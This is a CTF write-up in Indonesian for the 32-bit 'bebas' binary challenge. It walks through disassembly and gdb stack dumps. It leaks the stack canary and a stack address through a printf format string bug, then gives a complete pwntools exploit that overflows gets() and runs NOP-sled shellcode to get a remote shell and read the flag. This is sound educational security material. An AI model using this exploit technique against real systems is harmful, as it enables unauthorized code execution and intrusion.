# __ASGama CTF__ 
## _Bebas_

## Information
**Category:** | **Points:** | **Writeup Author**
--- | --- | ---
Binary Exploitation | 300 | l0l

**Description:** 

>
> nc asgama.web.id 40200

>
> [bebas](./bebas)

### buffow
```
ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=1e0fd5399de0053521ffb91126a380a5ccfa1255, not stripped

gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```

### bebas Disassembly

#### info func
```
gdb-peda$ info func
All defined functions:

Non-debugging symbols:
0x08048410  _init
0x08048450  printf@plt
0x08048460  gets@plt
0x08048470  getchar@plt
0x08048480  __stack_chk_fail@plt
0x08048490  puts@plt
0x080484a0  __libc_start_main@plt
0x080484b0  setvbuf@plt
0x080484c0  sprintf@plt
0x080484d0  __isoc99_scanf@plt
0x080484e0  __gmon_start__@plt
0x080484f0  _start
0x08048520  __x86.get_pc_thunk.bx
0x08048530  deregister_tm_clones
0x08048570  register_tm_clones
0x080485b0  __do_global_dtors_aux
0x080485e0  frame_dummy
0x080485e6  init
0x08048648  main
0x08048730  __libc_csu_init
0x08048790  __libc_csu_fini
0x080487a0  __stack_chk_fail_local
0x080487b4  _fini
```

#### main 
```
gdb-peda$ pdisass main
Dump of assembler code for function main:
   0x08048648 <+0>:	lea    ecx,[esp+0x4]
   0x0804864c <+4>:	and    esp,0xfffffff0
   0x0804864f <+7>:	push   DWORD PTR [ecx-0x4]
   0x08048652 <+10>:	push   ebp
   0x08048653 <+11>:	mov    ebp,esp
   0x08048655 <+13>:	push   ebx
   0x08048656 <+14>:	push   ecx
   0x08048657 <+15>:	sub    esp,0x140
   0x0804865d <+21>:	call   0x8048520 <__x86.get_pc_thunk.bx>
   0x08048662 <+26>:	add    ebx,0x199e
   0x08048668 <+32>:	mov    eax,gs:0x14
   0x0804866e <+38>:	mov    DWORD PTR [ebp-0xc],eax
   0x08048671 <+41>:	xor    eax,eax
   0x08048673 <+43>:	call   0x80485e6 <init>
   0x08048678 <+48>:	sub    esp,0xc
   0x0804867b <+51>:	lea    eax,[ebx-0x1830]
   0x08048681 <+57>:	push   eax
   0x08048682 <+58>:	call   0x8048450 <printf@plt>
   0x08048687 <+63>:	add    esp,0x10
   0x0804868a <+66>:	sub    esp,0x8
   0x0804868d <+69>:	lea    eax,[ebp-0xde]
   0x08048693 <+75>:	push   eax
   0x08048694 <+76>:	lea    eax,[ebx-0x1800]
   0x0804869a <+82>:	push   eax
   0x0804869b <+83>:	call   0x80484d0 <__isoc99_scanf@plt>
   0x080486a0 <+88>:	add    esp,0x10
   0x080486a3 <+91>:	call   0x8048470 <getchar@plt>
   0x080486a8 <+96>:	sub    esp,0x4
   0x080486ab <+99>:	lea    eax,[ebp-0xde]
   0x080486b1 <+105>:	push   eax
   0x080486b2 <+106>:	lea    eax,[ebx-0x17fd]
   0x080486b8 <+112>:	push   eax
   0x080486b9 <+113>:	lea    eax,[ebp-0x7a]
   0x080486bc <+116>:	push   eax
   0x080486bd <+117>:	call   0x80484c0 <sprintf@plt>
   0x080486c2 <+122>:	add    esp,0x10
   0x080486c5 <+125>:	sub    esp,0xc
   0x080486c8 <+128>:	lea    eax,[ebp-0x7a]
   0x080486cb <+131>:	push   eax
   0x080486cc <+132>:	call   0x8048450 <printf@plt>
   0x080486d1 <+137>:	add    esp,0x10
   0x080486d4 <+140>:	sub    esp,0xc
   0x080486d7 <+143>:	lea    eax,[ebx-0x17f4]
   0x080486dd <+149>:	push   eax
   0x080486de <+150>:	call   0x8048450 <printf@plt>
   0x080486e3 <+155>:	add    esp,0x10
   0x080486e6 <+158>:	sub    esp,0xc
   0x080486e9 <+161>:	lea    eax,[ebp-0x142]
   0x080486ef <+167>:	push   eax
   0x080486f0 <+168>:	call   0x8048460 <gets@plt>
   0x080486f5 <+173>:	add    esp,0x10
   0x080486f8 <+176>:	sub    esp,0xc
   0x080486fb <+179>:	lea    eax,[ebx-0x17de]
   0x08048701 <+185>:	push   eax
   0x08048702 <+186>:	call   0x8048490 <puts@plt>
   0x08048707 <+191>:	add    esp,0x10
   0x0804870a <+194>:	mov    eax,0x0
   0x0804870f <+199>:	mov    edx,DWORD PTR [ebp-0xc]
   0x08048712 <+202>:	xor    edx,DWORD PTR gs:0x14
   0x08048719 <+209>:	je     0x8048720 <main+216>
   0x0804871b <+211>:	call   0x80487a0 <__stack_chk_fail_local>
   0x08048720 <+216>:	lea    esp,[ebp-0x8]
   0x08048723 <+219>:	pop    ecx
   0x08048724 <+220>:	pop    ebx
   0x08048725 <+221>:	pop    ebp
   0x08048726 <+222>:	lea    esp,[ecx-0x4]
   0x08048729 <+225>:	ret    
End of assembler dump.
```

Program ini memiliki canary protection, sehingga kita tidak bisa seenaknya overwrite stack. Dan juga kali ini tidak ada fungsi yang memberi shell ataupun melakukan `cat flag` seperti soal-soal lainnya. Berarti selain harus bypass canary protection, kita juga harus membuat shell sendiri. Namun untuk masalah shell ini tidak terlalu bermasalah karena `NX disabled` sehingga kita bisa letakkan shell di stack. Tinggal cari cara overwrite return address main lalu diarahkan ke stack.

Setelah beberapa pengamatan, ditemukan bahwa program ini memiliki format string vulnerability pada printf.
```
 ./bebas 
Selamat Datang di Co-Jek
Masukan Nama Anda:
>> %x 
Hai 8048803!
Masukan alamat : 
>> Pesanan akan segera diantar!
```

Maka kita bisa menggunakan vulnerability ini untuk mendapatkan nilai canary. Nilai canary disimpan di `ebp-0xc`. 
```
gdb-peda$ x $ebp-0xc
0xffffcedc:	0x3eafa200
```

Kondisi tepat sebelum printf:
```
[-------------------------------------code-------------------------------------]
   0x80486c5 <main+125>:	sub    esp,0xc
   0x80486c8 <main+128>:	lea    eax,[ebp-0x7a]
   0x80486cb <main+131>:	push   eax
=> 0x80486cc <main+132>:	call   0x8048450 <printf@plt>
   0x80486d1 <main+137>:	add    esp,0x10
   0x80486d4 <main+140>:	sub    esp,0xc
   0x80486d7 <main+143>:	lea    eax,[ebx-0x17f4]
   0x80486dd <main+149>:	push   eax
Guessed arguments:
arg[0]: 0xffffce6e ("Hai %x!\n")
[------------------------------------stack-------------------------------------]
0000| 0xffffcd90 --> 0xffffce6e ("Hai %x!\n")
0004| 0xffffcd94 --> 0x8048803 ("Hai %s!\n")
0008| 0xffffcd98 --> 0xffffce0a --> 0xce007825 
0012| 0xffffcd9c --> 0x80486a8 (<main+96>:	sub    esp,0x4)
0016| 0xffffcda0 --> 0x0 
0020| 0xffffcda4 --> 0x8048304 ("__libc_start_main")
0024| 0xffffcda8 --> 0x0 
0028| 0xffffcdac --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080486cc in main ()
gdb-peda$ x/160wx $esp
0xffffcd90:	0xffffce6e	0x08048803	0xffffce0a	0x080486a8
0xffffcda0:	0x00000000	0x08048304	0x00000000	0x00000000
0xffffcdb0:	0xf7fdf289	0x0000093c	0xf7ddde54	0xf63d4e2e
0xffffcdc0:	0xf7fcf110	0xf7fdf73d	0x00000001	0x00000001
0xffffcdd0:	0xf7de7438	0x0000093c	0xf7de7cc8	0xf7fcf110
0xffffcde0:	0xffffce34	0xffffce30	0x00000003	0x00000000
0xffffcdf0:	0xf7ffd000	0xf7de7cc8	0xf7dde012	0xf7de7438
0xffffce00:	0xf63d4e2e	0x08048304	0x7825ea71	0xffffce00
0xffffce10:	0xffffce34	0xf7fcf3e0	0x00000000	0x00000000
0xffffce20:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffce30:	0x00000000	0x00000000	0x000000c2	0x00000fff
0xffffce40:	0xf7fdf409	0xf63d4e2e	0xf7ffdaf8	0xffffcebc
0xffffce50:	0x00000000	0xf7fdff9b	0x0804823c	0xffffcebc
0xffffce60:	0xf7ffda9c	0x00000001	0xf7fcf410	0x61480001
0xffffce70:	0x78252069	0x00000a21	0xf7ffd940	0x000000c2
0xffffce80:	0x00000000	0x00ca0000	0x00000000	0xf7ffd000
0xffffce90:	0x00000000	0x00000000	0x00000000	0x00a95f00
0xffffcea0:	0x00000009	0xffffd177	0xf7e0a049	0xf7fb2748
0xffffceb0:	0xf7faf000	0xf7faf000	0x00000000	0xf7e0a1ab
0xffffcec0:	0xf7faf3fc	0x00000000	0x00000001	0x0804877b
0xffffced0:	0x00000001	0xffffcf94	0xffffcf9c	0x00a95f00
0xffffcee0:	0xffffcf00	0x00000000	0x00000000	0xf7df2e81
0xffffcef0:	0xf7faf000	0xf7faf000	0x00000000	0xf7df2e81
0xffffcf00:	0x00000001	0xffffcf94	0xffffcf9c	0xffffcf24
0xffffcf10:	0x00000001	0x00000000	0xf7faf000	0xf7fe575a
0xffffcf20:	0xf7ffd000	0x00000000	0xf7faf000	0x00000000
0xffffcf30:	0x00000000	0x419864fe	0x005ae2ee	0x00000000
0xffffcf40:	0x00000000	0x00000000	0x00000001	0x080484f0
0xffffcf50:	0x00000000	0xf7feada0	0xf7fe59b0	0xf7ffd000
0xffffcf60:	0x00000001	0x080484f0	0x00000000	0x08048511
0xffffcf70:	0x08048648	0x00000001	0xffffcf94	0x08048730
0xffffcf80:	0x08048790	0xf7fe59b0	0xffffcf8c	0xf7ffd940
0xffffcf90:	0x00000001	0xffffd177	0x00000000	0xffffd1bb
0xffffcfa0:	0xffffd1ef	0xffffd226	0xffffd23f	0xffffd250
0xffffcfb0:	0xffffd258	0xffffd263	0xffffd26f	0xffffd27e
0xffffcfc0:	0xffffd2b5	0xffffd2c9	0xffffd30b	0xffffd31f
0xffffcfd0:	0xffffd340	0xffffd357	0xffffd371	0xffffd3a0
0xffffcfe0:	0xffffd3b4	0xffffd3c6	0xffffd3d3	0xffffd3eb
0xffffcff0:	0xffffd41f	0xffffd43b	0xffffd44e	0xffffd46c
0xffffd000:	0xffffd487	0xffffd49c	0xffffd4b3	0xffffd4cb
```

Kita lihat address yang diprint oleh printf:
```
gdb-peda$ ni
Hai 8048803!
```

Nilai tersebut ada pada stack pada address 0xffffcd94, dan ini merupakan address argumen pertama. Sementara canary ada pada 0xffffcedc. 
Offset dari canary (0xffffcedc-0xffffcd94).
Berarti canary akan berada pada argumen ke (0xffffcedc-0xffffcd94)/4 +1 = 83.

Sekarang kita bisa leak canary dengan memasukkan `%83$x` pada input pertama.
Selanjutnya, karena kemungkinan ASLR aktif di server, kita tidak tahu address stack. Kita juga harus leak address dari stack.

Jika kita lihat isi dari stack setelah canary : 0xffffcf00, nilai ini adalah alamat pada stack yang letaknya di bagian bawah. Kita berharap saja nilai di alamat setelah stack ini selalu berisi alamat pada stack yang letaknya di bawah. Sehingga kita ambil address nya dengan `%84$x`, lalu kita return ke alamat tersebut.

Pertama, kita cari dulu panjang / padding dari input kedua kita sampai ke return. Pasang breakpoint pada saat gets dan pada saat return.

```
gdb-peda$ break *0x080486f0
Breakpoint 1 at 0x80486f0
gdb-peda$ break *0x08048729
Breakpoint 2 at 0x8048729
```

Setelah gets
```
   0x80486f0 <main+168>:	call   0x8048460 <gets@plt>
=> 0x80486f5 <main+173>:	add    esp,0x10
   0x80486f8 <main+176>:	sub    esp,0xc
   0x80486fb <main+179>:	lea    eax,[ebx-0x17de]
   0x8048701 <main+185>:	push   eax
   0x8048702 <main+186>:	call   0x8048490 <puts@plt>
[------------------------------------stack-------------------------------------]
0000| 0xffffcd90 --> 0xffffcda6 ("AAAA")
0004| 0xffffcd94 --> 0x8048803 ("Hai %s!\n")
0008| 0xffffcd98 --> 0xffffce0a --> 0xceb40041 
0012| 0xffffcd9c --> 0x80486a8 (<main+96>:	sub    esp,0x4)
0016| 0xffffcda0 --> 0x0 
0020| 0xffffcda4 --> 0x41418304 
0024| 0xffffcda8 --> 0x4141 ('AA')
0028| 0xffffcdac --> 0x0 
[------------------------------------------------------------------------------]
```

Saat akan return 
```
[-------------------------------------code-------------------------------------]
   0x8048724 <main+220>:	pop    ebx
   0x8048725 <main+221>:	pop    ebp
   0x8048726 <main+222>:	lea    esp,[ecx-0x4]
=> 0x8048729 <main+225>:	ret    
   0x804872a:	xchg   ax,ax
   0x804872c:	xchg   ax,ax
   0x804872e:	xchg   ax,ax
   0x8048730 <__libc_csu_init>:	push   ebp
[------------------------------------stack-------------------------------------]
0000| 0xffffcefc --> 0xf7df2e81 (<__libc_start_main+241>:	add    esp,0x10)
0004| 0xffffcf00 --> 0x1 
0008| 0xffffcf04 --> 0xffffcf94 --> 0xffffd177 ("/home/l0l/CTF/Soal/Writeup/ctf-writeup/ASGamaCTF/Binary/Bebas/bebas")
0012| 0xffffcf08 --> 0xffffcf9c --> 0xffffd1bb ("XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0")
0016| 0xffffcf0c --> 0xffffcf24 --> 0x0 
0020| 0xffffcf10 --> 0x1 
0024| 0xffffcf14 --> 0x0 
0028| 0xffffcf18 --> 0xf7faf000 --> 0x1d4d6c 
[------------------------------------------------------------------------------]
```

Kita hitung padding nya : 0xffffcefc (alamat return) - 0xffffcda6 (alamat input) = 342

Lalu susun payload, tempatkan karakter sampah sebanyak (0x142-0xc) (sampai sebelum canary), lalu canary, lalu address stack, lalu padding sampai habis, lalu return address, lalu nop slides dan shell.

### Payload
```py
from pwn import *

context.arch='i386'

pad = 342

r = remote('asgama.web.id',40200)
r.recvuntil('>> ')
r.sendline("%83$x.%84$x")
r.recvuntil('Hai ')
addr = r.recvuntil('!')[:-1]

canary = int(addr.split('.')[0],16)
stack = int(addr.split('.')[1],16)

print hex(canary),hex(stack)

r.recv()

payload = 'A'*(0x142-0xc)+p32(canary)+p32(stack)
payload += 'A'*(pad-len(payload))+p32(stack)+'\x90'*0x100+asm(shellcraft.sh())+'\n'
r.sendline(payload)
r.interactive()
```


### Result 
```
python ex.py 
[+] Opening connection to asgama.web.id on port 40200: Done
0xb2882300 0xfff1b620
[*] Switching to interactive mode
Pesanan akan segera diantar!
$ ls
flag
soal
$ cat flag
GamaCTF{b3ba5_7623624828}
```

### Flag 
GamaCTF{b3ba5_7623624828}
